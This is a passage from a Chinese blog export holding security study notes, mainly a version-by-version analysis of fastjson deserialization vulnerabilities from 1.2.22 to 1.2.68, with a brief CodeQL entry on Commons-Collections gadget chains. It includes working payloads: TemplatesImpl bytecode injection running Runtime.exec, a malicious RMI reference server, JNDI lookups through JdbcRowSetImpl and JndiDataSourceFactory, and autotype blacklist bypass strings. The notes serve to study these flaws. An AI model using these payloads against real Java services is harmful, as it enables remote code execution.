        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>codeql编写cc链查询</title>
    <url>/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p>有了之前的cc3的数据库,就可以尝试编写cc的反序列化调用链了,在编写ql语句之前,首先需要明确反序列化利用链的几个基础条件</p>
<p><a href="https://tttang.com/archive/1511/">参考这篇文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化利用链的条件:</span><br><span class="line">1. source，入口点，一般就是一个readObject方法</span><br><span class="line">2. sink，执行点，一般是动态方法执行、Jndi注入、写文件之类的   在本次的链中就是invokerTransformer的transform方法</span><br><span class="line">3. gadget，连接source和sink的多个类。有几个条件：</span><br><span class="line">	1). 类之间的方法调用是链式的。</span><br><span class="line">	2). 类实例之间的关系是嵌套的，调用链上后一个类实例是前一个类实例的属性。</span><br><span class="line">	3). 调用链上的类都需要是可以序列化的。</span><br></pre></td></tr></table></figure>

<p>由于codeql无法在多个数据库之间查询流,并且cc的source全是jdk自带类的readObject,万恶之源还得是LazyMap和ChainedTransformer,就暂且以他两作为source,执行点呢就更简单了,就是InvokerTransformer和InstantiareTransformer</p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>codeql</tag>
        <tag>cc</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson反序列化漏洞学习记录</title>
    <url>/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Fastjson是阿里开发的一个Java库, 提供了将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效类<span id="more"></span></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，Fastjson自定义的反序列化机制会调用指定类中的setter方法及部分getter方法，当组件开启了autotype功能并且反序列化不可信数据时（后边即使不开也没用，除非启用safemode），攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有gadget，则会造成一些严重的安全问题。</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">POC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">POC</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set调用&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"><span class="comment">//1.2.22 - 1.2.24</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        POC poc = <span class="keyword">new</span> POC(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        String s = JSON.toJSONString(poc);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.POC\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220606212042046.png" alt="image-20220606212042046"></p>
<p>可以看到,序列化的时候调用了get,反序列化的时候调用了无参构造方法,set和get方法</p>
<h2 id="漏洞历史分析"><a href="#漏洞历史分析" class="headerlink" title="漏洞历史分析"></a>漏洞历史分析</h2><h2 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22 - 1.2.24"></a>1.2.22 - 1.2.24</h2><p>跟着源码调试了一下,大体流程就是对字符串做语法分析,拆分开,并且对每个属性用fieldInfo进行存储,最后使用反射调用它对应的set方法,这个set方法名是字符串拼接的,不难让人想到TemplatesImpl这个类,这个类有一个<code>getOutputProperties()</code>方法</p>
<p>但是有个问题就是这个类中的所有属性都是私有属性,需要添加<code>Feature.SupportNonPublicField</code>字段才能通过<code>JSON.parseObject</code>进行字符串到对象的转换过程</p>
<h4 id="TemplatesImpl调用链"><a href="#TemplatesImpl调用链" class="headerlink" title="TemplatesImpl调用链"></a>TemplatesImpl调用链</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">   TemplatesImpl.newTransformer()</span><br><span class="line">      TemplatesImpl.getTransletInstance()</span><br><span class="line">         TemplatesImpl.defineTransletClasses()</span><br><span class="line">            ClassLoader.defineClass()</span><br><span class="line">               Class.newInstance()</span><br></pre></td></tr></table></figure>

<p>最主要的地方就是构造TemplatesImpl类中的<code>_bytecode</code>属性</p>
<p>这个地方可以使用反射构造继承了<code>AbstractTranslet</code>的恶意类来执行代码</p>
<p>恶意代码可以添加在恶意类的静态代码块在类加载的时候执行或者添加到它的构造方法中在实例化的时候调用</p>
<p>学习一下使用<code>javassist</code>这个工具来生成一个类并修改代码生成字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastJson</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;  </span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass evil = pool.get(evil.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        evil.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        evil.setName(randomClassName);</span><br><span class="line">        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = evil.toBytecode();</span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        <span class="keyword">final</span> String Template = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + Template + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="为什么类需要是public的"><a href="#为什么类需要是public的" class="headerlink" title="为什么类需要是public的"></a>为什么类需要是public的</h5><p>值得一提的是这里的恶意类必须是public的,否则在<code>TemplatesImpl</code>类中的<code>getTransletInstance</code>方法中会无法获取该类的实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607213128139.png" alt="image-20220607213128139"></p>
<p>根本原因在<code>Class.newInstance</code>的调用链这里</p>
<p>按理说我定义的类的包和它就是一致的呀,明明代码都写在一个包下面,但是根据调试发现,javassist生成的class它是不带包名的</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607221426566.png" alt="image-20220607221426566"></p>
<p>所以这个判断的地方输出false,而只有它的修饰符是public才能进入下面的代码并且返回true最后实现实例化</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607220335886.png" alt="image-20220607220335886"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607220315641.png" alt="image-20220607220315641"></p>
<p>这里对于利用条件是有要求的，Fastjson默认只会反序列化public属性，而outputProperties和_bytecodes由private修饰，所以受害端的parseObject必须设置Feature.portNonPublicField，而Feature.portNonPublicField在1.22才被引入，所以这条利用链条件过于苛刻</p>
<h4 id="JdbcRowSetImpl调用链"><a href="#JdbcRowSetImpl调用链" class="headerlink" title="JdbcRowSetImpl调用链"></a>JdbcRowSetImpl调用链</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220608005810266.png" alt="image-20220608005810266"></p>
<p>在<code>JdbcRowSetImpl#connect</code>方法中调用了参数名可控的<code>InitialContext.lookup()</code>方法</p>
<p>这里有一个基础知识点,就是子类虽然可以继承父类的private属性,但是<strong>必须通过父类中定义的get和set才能访问到</strong></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220608005043003.png" alt="image-20220608005043003"></p>
<p>共有三处调用了<code>connect()</code>方法</p>
<p>里面第三个<code>setAutoCommit</code>方法对应的参数<code>autoCommit</code>同时拥有get方法,可以使用fastjson还原类的时候调用set方法的特性从而调用到<code>lookup</code></p>
<p>编写恶意服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启http服务并将静态代码块有恶意代码的恶意类放上去</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220608011811781.png" alt="image-20220608011811781" style="zoom:67%;" />

<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>



<h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><p>1.2.25开始引入了 checkAutoType 安全机制，默认关闭的情况下不能反序列化类，开启后对反序列化类进行黑名单检测，所以1.2.25~1.2.24的关键就在于<strong>针对开启了Autotype的Fastjson进行黑名单绕过</strong></p>
<p>黑名单的实现在<code>com.alibaba.fastjson.parser.ParserConfig</code>的<code>denyList</code>属性中</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607234636647.png" alt="image-20220607234636647"></p>
<h5 id="checkAutoType函数分析"><a href="#checkAutoType函数分析" class="headerlink" title="checkAutoType函数分析"></a>checkAutoType函数分析</h5><p>如果能直接添加到白名单中也就不需要下面的绕过了</p>
<p>首先需要打开autoType才能进行对不在白名单中的类型进行转换</p>
<p>其中一种方便调试的最简单的方式是设置全局<code>ParserConfig</code>的<code>AutoTypeSupport</code>为true</p>
<p>开启之后让autoTypeSupport为true才能有机会进去这段代码</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220609204549908.png" alt="image-20220609204549908"></p>
<p>在这段代码中判断,如果在白名单<code>acceptList</code>中则调用<code>TypeUtils.loadClass</code>,不在白名单里面进入下面是否在黑名单中的判断,如果不在黑名单才能接着往下走</p>
<p>直到源码的861行,调用<code>TypeUtils.loadClass</code>去加载类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610152821158.png" alt="image-20220610152821158"></p>
<p>这个loadClass方法会将以L开头和;结尾的类名去除L和;再去递归调用加载</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610152802367.png" alt="image-20220610152802367"></p>
<p>这里涉及到一个叫做JNI字段描述符的东西</p>
<p>JNI全称是(Java Native Interface)</p>
<p><a href="https://blog.csdn.net/m0_37537867/article/details/124137225">https://blog.csdn.net/m0_37537867/article/details/124137225</a></p>
<p>它提供一种Java字节码调用c/c++的解决方案</p>
<p>由于Java支持函数重载，因此仅仅根据函数名是没法找到对应的JNI函数。为了解决这个问题，JNI将参数类型和返回值类型作为函数的签名信息。</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610162925861.png" alt="image-20220610162925861"></p>
<p><strong>JNI常用的数据类型及对应字符</strong></p>
<table>
<thead>
<tr>
<th>Java 类型</th>
<th>符号</th>
</tr>
</thead>
<tbody><tr>
<td>Boolean</td>
<td>Z</td>
</tr>
<tr>
<td>Byte</td>
<td>B</td>
</tr>
<tr>
<td>Char</td>
<td>C</td>
</tr>
<tr>
<td>Short</td>
<td>S</td>
</tr>
<tr>
<td>Int</td>
<td>I</td>
</tr>
<tr>
<td>Long</td>
<td>J</td>
</tr>
<tr>
<td>Float</td>
<td>F</td>
</tr>
<tr>
<td>Double</td>
<td>D</td>
</tr>
<tr>
<td>Void</td>
<td>V</td>
</tr>
<tr>
<td>objects对象</td>
<td>以”<code>L</code>“开头，以”<code>;</code>“结尾，中间是用”<code>/</code>“ 隔开的包及类名。比如：<code>Ljava/lang/String;</code>如果是嵌套类，则用<code>$</code>来表示嵌套。例如 “<code>(Ljava/lang/String;Landroid/os/FileUtils$FileStatus;)Z</code>”</td>
</tr>
</tbody></table>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>综合以上条件,需要开启autoTypeSupport并且将类名进行简单改造,给类名添加<code>L</code>和<code>;</code>包裹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="lt-1-2-42"><a href="#lt-1-2-42" class="headerlink" title="&lt;=1.2.42"></a>&lt;=1.2.42</h2><p>1.2.42版本将黑名单进行了hash处理</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610190544304.png" alt="image-20220610190544304" style="zoom:80%;" />

<p>在checkAutoType函数中</p>
<p>先进行一次判断并截取掉了L和;</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610223234128.png" alt="image-20220610223234128"></p>
<p>接下来的代码就是之前检查黑白名单的hash版</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610223337297.png" alt="image-20220610223337297"></p>
<p>到loadClass这里还是递归调用</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610223441375.png" alt="image-20220610223441375"></p>
<p>综上所述,可以使用双写L和;的方式绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="lt-1-2-43"><a href="#lt-1-2-43" class="headerlink" title="&lt;=1.2.43"></a>&lt;=1.2.43</h2><p>该版本对于双写LL的poc进行了判断和限制</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610231237572.png" alt="image-20220610231237572"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parseObject(&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;<span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>

<p>但是可以通过添加<code>[</code>和<code>[&#123;</code>的方式来进行绕过,添加<code>[</code>可以理解,但是添加<code>[&#123;</code>还不甚了解</p>
<p>原因是为了让这个地方的token=14从而绕过数组转换抛出异常</p>
<p>关于fastjson中token的解析<a href="https://blog.csdn.net/qq_45854465/article/details/120626835">https://blog.csdn.net/qq_45854465/article/details/120626835</a></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611160647239.png" alt="image-20220611160647239"></p>
<h2 id="lt-1-2-45"><a href="#lt-1-2-45" class="headerlink" title="&lt;=1.2.45"></a>&lt;=1.2.45</h2><p>出现了新的利用类直接绕过了黑名单限制<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
<blockquote>
<p>但是mybatis版本必须小于3.5.6</p>
</blockquote>
<p>该类中的<code>setProperties()</code>方法存在Jndi注入的问题</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611174720213.png" alt="image-20220611174720213"></p>
<p>新建一个LDAP服务,并且将远程对象引用绑定上去</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611170739137.png" alt="image-20220611170739137"></p>
<p>写段代码测试一下</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611174751726.png" alt="image-20220611174751726"></p>
<p>利用fastjson构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="lt-1-2-47-—-无需AutoTypeSupport"><a href="#lt-1-2-47-—-无需AutoTypeSupport" class="headerlink" title="&lt;=1.2.47   —(无需AutoTypeSupport)"></a><strong>&lt;=1.2.47</strong>   —(无需AutoTypeSupport)</h2><p>这个版本之前的漏洞都必须要在开启 AutoTypeSupport 的情况下才能利用。由于fastjson会将一些基本类型的类对象提前放到mappings中缓存，通过类缓存机制可以绕过黑白名单检测该版本中，通过利用类缓存机制（通过java.lang.Class类提前带入恶意类并缓存到 TypeUtils.mappings 中），可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。（漏洞点在 checkAutoType 中）</p>
<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(<span class="string">&quot;[&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>java.lang.Class<span class="string">&quot;,&quot;</span>val<span class="string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="string">&quot;&#125;,&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="string">&quot;,&quot;</span>dataSourceName<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//localhost:10389/cn=test,dc=example,dc=com&quot;,&quot;autoCommit&quot;:true&#125;]&quot;);</span></span><br></pre></td></tr></table></figure>

<p>默认使用的是<code>DefaultJSONParser.parser</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614181358097.png" alt="image-20220614181358097"></p>
<p>使用lexer这个词法分析器检测到<code>@type</code>之后,会调用<code>checkAutoType</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614181943820.png" alt="image-20220614181943820"></p>
<p>主要的点还是在<code>checkAutoType</code>中</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614185549671.png" alt="image-20220614185549671"></p>
<p>经过前面对poc的基础判断之后,会进入<code>deserializers.findClass</code>,这里实际上是去一个桶里面找有没有对应的类,如果类名equal则返回这个类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614183113141.png" alt="image-20220614183113141"></p>
<p>桶里面存了一堆类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614185937978.png" alt="image-20220614185937978"></p>
<p>获取到java.long.Class类之后会返回到</p>
<p>DefaultJSONParser中继续执行</p>
<p>获取到<code>MiscCodec</code>这个类之后,调用<code>deserialize</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614190503311.png" alt="image-20220614190503311"></p>
<p>在这个方法中,获取到了val对应的值<code>com.sun.rowset.JdbcRowSetImpl</code></p>
<p>并且在这个if中进行了类加载</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614191433526.png" alt="image-20220614191433526"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614192231949.png" alt="image-20220614192231949"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614192924962.png" alt="image-20220614192924962"></p>
<p>这里的第三个参数<code>cache</code>为<code>true</code>很重要,这样加载完的类就会存储到之前的<code>mapping</code>中,此时<code>com.sun.rowset.JdbcRowSetImpl</code>就存储在了<code>getClassFromMapping</code>这个方法对应的<code>mapping</code>中</p>
<p>接下来继续解析字符串,检测到左侧大括号,调用<code>paseObject</code>,实际上还是调用的<code>DefaultJSONParser#parseObject</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614193252144.png" alt="image-20220614193252144"></p>
<p>继续到<code>checkAutoType</code>的时候,就可以直接从这里获取到<code>com.sun.rowset.JdbcRowSetImpl</code>类了</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614193532234.png" alt="image-20220614193532234"></p>
<p>走的这个if还不需要开启<code>AutoType</code>从而绕过了checkAutoType</p>
<h2 id="lt-1-2-68"><a href="#lt-1-2-68" class="headerlink" title="&lt;=1.2.68"></a>&lt;=1.2.68</h2><p><a href="https://blog.csdn.net/mole_exp/article/details/122315526">参考</a></p>
<p>但是该漏洞再次实现了在autoType关闭的情况下绕过了<code>ParserConfig#checkAutoType()</code>的安全检测。但具体的漏洞利用的危害程度要取决于目标服务的环境（这一点后面会说到），换言之，漏洞利用并不能做到非常通用，因此漏洞的严重性要稍逊于<code>&lt;= 1.2.47</code> 版本的那个漏洞。</p>
<p>通过<code>public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features)</code>的代码可知，<strong>如果同时符合以下条件，则可以在autoType关闭的情况下，绕过<code>ParserConfig#checkAutoType()</code>的安全校验，从而反序列化指定类</strong>：</p>
<ul>
<li>(1) <code>expectClass</code>不为<code>null</code>，且不等于<code>Object.class</code>、<code>Serializable.class</code>、<code>Cloneable.class</code>、<code>Closeable.class</code>、<code>EventListener.class</code>、<code>Iterable.class</code>、<code>Collection.class</code>;</li>
<li>(2) <code>expectClass</code>需要在缓存集合<code>TypeUtils#mappings</code>中；</li>
<li>(3) <code>expectClass</code>和<code>typeName</code>都不在黑名单中；</li>
<li>(4) <code>typeName</code>不是<code>ClassLoader</code>、<code>DataSource</code>、<code>RowSet</code>的子类；</li>
<li>(5) <code>typeName</code>是<code>expectClass</code>的子类。(isAssignableFrom()方法判断是否为父类)</li>
</ul>
<blockquote>
<p>另外，在<code>1.2.68</code>版本开始，新增了<code>safeMode</code>加固模式。配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。但该模式默认是不开启的。所以不会影响该漏洞的执行流。<br>该模式的校验判断也是在<code>ParserConfig#checkAutoType()</code>方法中。</p>
</blockquote>
<p>大多数时候调用<code>ParserConfig#checkAutoType()</code> 进行安全校验时，参数<code>expectClass</code>的位置传入的都是<code>null</code>。</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220615153348640.png" alt="image-20220615153348640"></p>
<p>有两个反序列化器的地方调用了传递expectClass的<code>checkAutoType</code>方法</p>
<h3 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h3><h5 id="CalcException"><a href="#CalcException" class="headerlink" title="CalcException"></a>CalcException</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CalcException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCommand</span><span 